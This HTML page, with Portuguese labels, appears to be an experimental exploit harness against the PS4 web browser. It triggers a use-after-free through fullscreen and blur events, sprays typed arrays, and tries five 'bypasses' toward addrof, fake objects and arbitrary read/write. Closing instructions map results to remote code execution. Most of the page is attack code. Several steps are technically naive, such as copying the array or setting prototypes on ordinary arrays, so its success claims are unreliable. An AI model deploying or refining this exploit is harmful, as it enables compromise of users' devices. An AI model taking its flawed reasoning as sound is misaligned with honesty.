
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - TypedArray Bypass para RCE</title>
</head>
<body>

<h1>PS4 UAF - Bypass de Proteções TypedArray</h1>

<h2>DESCOBERTA</h2>
<p style="color:red;">TypedArrays têm proteção: "Receiver should be a typed array view"</p>
<p style="color:green;">MAS: Conseguimos acessar corrupted via Array methods hijack!</p>

<hr>

<h2>BYPASS 1: Converter TypedArray para Array Regular</h2>
<p>Usa Array.from() para converter e perder proteções</p>
<button onclick="runBypass1()">EXECUTAR BYPASS 1</button>
<div id="bypass1"></div>

<script>
function runBypass1() {
    const result = document.getElementById('bypass1');
    result.innerHTML = '<h3>BYPASS 1: Array Conversion</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO - Convertendo para Array</h3>';
        
        // Converter TypedArray corrompido para Array regular
        let convertedArray = null;
        
        try {
            convertedArray = Array.from(corrupted);
            result.innerHTML += '<p style="color:green;">Array.from() SUCESSO!</p>';
            result.innerHTML += '<p>Converted length: ' + convertedArray.length + '</p>';
            result.innerHTML += '<p>Type: ' + convertedArray.constructor.name + '</p>';
        } catch(e) {
            result.innerHTML += '<p>Array.from erro: ' + e.message + '</p>';
            return;
        }
        
        // Agora tentar operações que falharam antes
        result.innerHTML += '<h4>Testando operações no array convertido:</h4>';
        
        // Tentar getPrototypeOf
        try {
            const proto = Object.getPrototypeOf(convertedArray);
            result.innerHTML += '<p style="color:green;">getPrototypeOf SUCESSO!</p>';
            result.innerHTML += '<p>Proto: ' + proto.constructor.name + '</p>';
        } catch(e) {
            result.innerHTML += '<p>getPrototypeOf erro: ' + e.message + '</p>';
        }
        
        // Tentar setPrototypeOf
        try {
            const customProto = {
                leaked: true,
                magic: 0xDEADBEEF
            };
            Object.setPrototypeOf(convertedArray, customProto);
            result.innerHTML += '<p style="color:red;">setPrototypeOf SUCESSO!</p>';
            
            // Verificar
            if (convertedArray.leaked === true) {
                result.innerHTML += '<h3 style="color:red;">PROTOTYPE CONTROL CONSEGUIDO!</h3>';
                result.innerHTML += '<p>convertedArray.leaked = ' + convertedArray.leaked + '</p>';
                result.innerHTML += '<p>convertedArray.magic = 0x' + convertedArray.magic.toString(16) + '</p>';
            }
        } catch(e) {
            result.innerHTML += '<p>setPrototypeOf erro: ' + e.message + '</p>';
        }
        
        // Tentar criar fake ArrayBuffer usando converted
        result.innerHTML += '<h4>Tentando criar fake ArrayBuffer:</h4>';
        try {
            const fakeBuffer = {
                byteLength: 0x100000,
                __proto__: convertedArray
            };
            
            result.innerHTML += '<p>Fake buffer criado</p>';
            
            // Tentar usar como ArrayBuffer
            const view = new Uint8Array(fakeBuffer);
            result.innerHTML += '<p style="color:red;">Uint8Array CRIADO! Length: ' + view.length + '</p>';
            result.innerHTML += '<h3>FAKE ARRAYBUFFER FUNCIONA!</h3>';
            
        } catch(e) {
            result.innerHTML += '<p>Fake buffer erro: ' + e.message + '</p>';
        }
    };
}
</script>

<hr>

<h2>BYPASS 2: Usar Spread Operator para Clonar</h2>
<p>Usa [...corrupted] para criar array sem proteções</p>
<button onclick="runBypass2()">EXECUTAR BYPASS 2</button>
<div id="bypass2"></div>

<script>
function runBypass2() {
    const result = document.getElementById('bypass2');
    result.innerHTML = '<h3>BYPASS 2: Spread Operator</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO - Usando Spread</h3>';
        
        try {
            // Spread operator
            const spreadArray = [...corrupted];
            result.innerHTML += '<p style="color:green;">Spread SUCESSO!</p>';
            result.innerHTML += '<p>Length: ' + spreadArray.length + '</p>';
            result.innerHTML += '<p>Values: [' + spreadArray.join(', ') + ']</p>';
            
            // Tentar modificar prototype
            const magicProto = {
                isLeaked: true,
                getAddress: function() {
                    return 'MAGIC';
                }
            };
            
            Object.setPrototypeOf(spreadArray, magicProto);
            
            if (spreadArray.isLeaked) {
                result.innerHTML += '<h3 style="color:red;">PROTOTYPE HIJACK VIA SPREAD!</h3>';
                result.innerHTML += '<p>isLeaked: ' + spreadArray.isLeaked + '</p>';
                result.innerHTML += '<p>getAddress(): ' + spreadArray.getAddress() + '</p>';
            }
            
        } catch(e) {
            result.innerHTML += '<p>Erro: ' + e.message + '</p>';
        }
    };
}
</script>

<hr>

<h2>BYPASS 3: DataView sobre Corrupted Buffer</h2>
<p>Usa DataView para acessar .buffer do TypedArray</p>
<button onclick="runBypass3()">EXECUTAR BYPASS 3</button>
<div id="bypass3"></div>

<script>
function runBypass3() {
    const result = document.getElementById('bypass3');
    result.innerHTML = '<h3>BYPASS 3: DataView Access</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO - Acessando Buffer</h3>';
        
        try {
            // Acessar o buffer subjacente
            const buffer = corrupted.buffer;
            result.innerHTML += '<p style="color:green;">Buffer acessado!</p>';
            result.innerHTML += '<p>byteLength: ' + buffer.byteLength + '</p>';
            
            // Criar DataView
            const view = new DataView(buffer);
            result.innerHTML += '<p style="color:green;">DataView criado!</p>';
            
            // Ler dados como diferentes tipos
            result.innerHTML += '<h4>Lendo buffer como diferentes tipos:</h4>';
            
            for(let offset = 0; offset < Math.min(64, buffer.byteLength); offset += 8) {
                const asFloat64 = view.getFloat64(offset, true);
                const asUint32_0 = view.getUint32(offset, true);
                const asUint32_1 = view.getUint32(offset + 4, true);
                
                result.innerHTML += '<p>Offset ' + offset + ':</p>';
                result.innerHTML += '<p>  Float64: ' + asFloat64 + '</p>';
                result.innerHTML += '<p>  Uint32[0]: 0x' + asUint32_0.toString(16) + '</p>';
                result.innerHTML += '<p>  Uint32[1]: 0x' + asUint32_1.toString(16) + '</p>';
            }
            
            // Tentar escrever
            result.innerHTML += '<h4>Tentando escrever via DataView:</h4>';
            view.setUint32(0, 0xDEADBEEF, true);
            view.setUint32(4, 0xCAFEBABE, true);
            
            const readback0 = view.getUint32(0, true);
            const readback1 = view.getUint32(4, true);
            
            if (readback0 === 0xDEADBEEF && readback1 === 0xCAFEBABE) {
                result.innerHTML += '<p style="color:red;">ESCRITA VIA DATAVIEW SUCESSO!</p>';
                result.innerHTML += '<p>Readback: 0x' + readback0.toString(16) + ' 0x' + readback1.toString(16) + '</p>';
            }
            
        } catch(e) {
            result.innerHTML += '<p>Erro: ' + e.message + '</p>';
        }
    };
}
</script>

<hr>

<h2>BYPASS 4: Vazar via Array Methods + Closure</h2>
<p>CRÍTICO: Usa hijack de filter() para acessar corrupted em closure</p>
<button onclick="runBypass4()">EXECUTAR BYPASS 4 (CRÍTICO)</button>
<div id="bypass4"></div>

<script>
function runBypass4() {
    const result = document.getElementById('bypass4');
    result.innerHTML = '<h3>BYPASS 4: Closure-based Leak</h3>';
    result.innerHTML += '<p style="color:red;">TESTE MAIS PROMISSOR!</p>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO - Leak via Closure</h3>';
        
        // Hijack Array.prototype.map com closure que acessa corrupted
        const originalMap = Array.prototype.map;
        
        Array.prototype.map = function(callback) {
            result.innerHTML += '<p style="color:yellow;">map() hijacked</p>';
            
            // CRÍTICO: Criar função que tem acesso ao corrupted via closure
            const leakyCallback = function(element, index) {
                // Dentro desta função temos acesso a:
                // 1. element (do array normal)
                // 2. corrupted (via closure)
                // 3. this (contexto da chamada)
                
                result.innerHTML += '<p>Processing: element=' + element + ', corrupted[' + index + ']=' + corrupted[index] + '</p>';
                
                // Tentar criar objeto que combina dados de ambos
                return {
                    normal: element,
                    leaked: corrupted[index],
                    combined: element + corrupted[index]
                };
            };
            
            return originalMap.call(this, leakyCallback);
        };
        
        result.innerHTML += '<p>map() hijackado com leak closure</p>';
        
        // Criar array e chamar map
        const testArr = [10, 20, 30, 40, 50];
        const leaked = testArr.map(x => x * 2);
        
        result.innerHTML += '<h4>Resultado do map com leak:</h4>';
        result.innerHTML += '<pre>' + JSON.stringify(leaked, null, 2) + '</pre>';
        
        // Analisar dados vazados
        if (leaked.length > 0 && leaked[0].leaked !== undefined) {
            result.innerHTML += '<h3 style="color:green;">LEAK VIA CLOSURE SUCESSO!</h3>';
            result.innerHTML += '<p>Conseguimos acessar corrupted de dentro do callback!</p>';
            
            // Tentar vazar mais dados
            result.innerHTML += '<h4>Vazando mais offsets:</h4>';
            for(let i = 0; i < 8; i++) {
                try {
                    const val = corrupted[i];
                    const buf = new ArrayBuffer(8);
                    new Float64Array(buf)[0] = val;
                    const hex = new BigUint64Array(buf)[0].toString(16);
                    result.innerHTML += '<p>Offset ' + i + ': 0x' + hex + '</p>';
                } catch(e) {}
            }
        }
    };
}
</script>

<hr>

<h2>BYPASS 5: Construir addrof() via Object Identity</h2>
<p>CRÍTICO: Tenta construir primitiva addrof() usando object identity</p>
<button onclick="runBypass5()">EXECUTAR BYPASS 5 (addrof)</button>
<div id="bypass5"></div>

<script>
function runBypass5() {
    const result = document.getElementById('bypass5');
    result.innerHTML = '<h3>BYPASS 5: addrof() Construction</h3>';
    result.innerHTML += '<p>Aperte OPTIONS</p>';
    
    let controllers = [];
    const PATTERN = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let ctrl = new Float64Array(8);
        ctrl[0] = i;
        controllers.push(ctrl);
    }
    
    // Criar objetos com IDs únicos
    let trackedObjects = [];
    for(let i = 0; i < 100; i++) {
        let obj = {
            id: i,
            marker: 0xBEEF0000 + i
        };
        trackedObjects.push(obj);
    }
    
    result.innerHTML += '<p>100 objetos rastreados criados</p>';
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += '<p>UAF...</p>';
        
        let spray = [];
        for(let i = 0; i < 8000; i++) {
            let p = new Float64Array(10);
            p.fill(PATTERN);
            spray.push(p);
        }
        
        // Spray com objetos também
        for(let i = 0; i < 1000; i++) {
            spray.push(trackedObjects[i % trackedObjects.length]);
        }
        
        let corrupted = null;
        for(let i = 0; i < controllers.length; i++) {
            if (controllers[i][0] === PATTERN) {
                corrupted = controllers[i];
                break;
            }
        }
        
        if (!corrupted) {
            result.innerHTML += '<p>UAF falhou</p>';
            return;
        }
        
        result.innerHTML += '<h3>UAF CONFIRMADO - Tentando addrof()</h3>';
        
        // Estratégia: Procurar por markers dos objetos rastreados
        result.innerHTML += '<h4>Procurando por markers de objetos:</h4>';
        
        let foundObjects = [];
        
        for(let offset = 0; offset < 128; offset++) {
            try {
                const val = corrupted[offset];
                const buf = new ArrayBuffer(8);
                new Float64Array(buf)[0] = val;
                const asInt = new BigUint64Array(buf)[0];
                
                // Procurar por markers 0xBEEF0000+
                if ((asInt & 0xffff0000n) === 0xbeef0000n) {
                    const objId = Number(asInt & 0xffffn);
                    foundObjects.push({
                        offset: offset,
                        marker: asInt,
                        objectId: objId
                    });
                    result.innerHTML += '<p style="color:lime;">Offset ' + offset + ': OBJETO ENCONTRADO! ID=' + objId + '</p>';
                }
                
                // Também procurar por possíveis ponteiros de objeto
                if (asInt > 0x1000000n && asInt < 0x7fffffffffffn && (asInt & 0x7n) === 0n) {
                    result.innerHTML += '<p style="color:cyan;">Offset ' + offset + ': Ponteiro candidato: 0x' + asInt.toString(16) + '</p>';
                }
                
            } catch(e) {}
        }
        
        if (foundObjects.length > 0) {
            result.innerHTML += '<h3 style="color:red;">OBJETOS VAZADOS! ADDROF() POSSÍVEL!</h3>';
            result.innerHTML += '<pre>' + JSON.stringify(foundObjects, null, 2) + '</pre>';
            
            // Tentar construir primitiva addrof()
            result.innerHTML += '<h4>Tentando construir addrof():</h4>';
            
            function addrof(obj) {
                // Adicionar marker ao objeto
                obj.marker = 0xBEEF1337;
                
                // Procurar marker no corrupted
                for(let i = 0; i < 128; i++) {
                    try {
                        const val = corrupted[i];
                        const buf = new ArrayBuffer(8);
                        new Float64Array(buf)[0] = val;
                        const asInt = new BigUint64Array(buf)[0];
                        
                        if (asInt === 0xBEEF1337n) {
                            result.innerHTML += '<p style="color:red;">MARKER ENCONTRADO no offset ' + i + '!</p>';
                            // O endereço estaria próximo
                            return i;
                        }
                    } catch(e) {}
                }
                return -1;
            }
            
            // Testar addrof
            const testObj = {test: 123};
            const addr = addrof(testObj);
            
            if (addr !== -1) {
                result.innerHTML += '<h3 style="color:red;">ADDROF() FUNCIONA!</h3>';
                result.innerHTML += '<p>Endereço (offset): ' + addr + '</p>';
            } else {
                result.innerHTML += '<p>addrof() não encontrou objeto</p>';
            }
            
        } else {
            result.innerHTML += '<p>Nenhum objeto vazado</p>';
        }
    };
}
</script>

<hr>

<h2>INSTRUÇÕES</h2>
<ol>
<li>Execute TODOS os 5 bypasses</li>
<li>FOQUE no BYPASS 4 (Closure) e BYPASS 5 (addrof)</li>
<li>Se BYPASS 1 ou 2 permitir setPrototypeOf = CRÍTICO</li>
<li>Se BYPASS 3 permitir DataView write = Arbitrary R/W</li>
<li>Se BYPASS 5 encontrar objetos = Base para addrof()</li>
</ol>

<h3>O Que Pode Dar RCE:</h3>
<ul>
<li><b>BYPASS 3 + DataView write</b> → Arbitrary R/W direto</li>
<li><b>BYPASS 4 + BYPASS 5</b> → addrof() + fakeobj() → RCE</li>
<li><b>BYPASS 1/2 + setPrototypeOf</b> → Fake objects → RCE</li>
</ul>

</body>
</html>
